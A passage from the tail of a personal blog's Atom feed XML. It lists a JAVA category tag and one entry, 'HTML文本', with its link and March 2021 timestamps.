    <category term="JAVA" scheme="http://jacen-cpu.github.io/categories/JAVA/"/>
    
    
  </entry>
  
  <entry>
    <title>HTML文本</title>
    <link href="http://jacen-cpu.github.io/2021/03/11/HTML%E6%96%87%E6%9C%AC/"/>
    <id>http://jacen-cpu.github.io/2021/03/11/HTML%E6%96%87%E6%9C%AC/</id>
    <published>2021-03-11T08:34:00.000Z</published>
    <updated>2021-03-11T08:34:00.856Z</updated>
    
    
    
    
    
  </entry>
  
</feed>
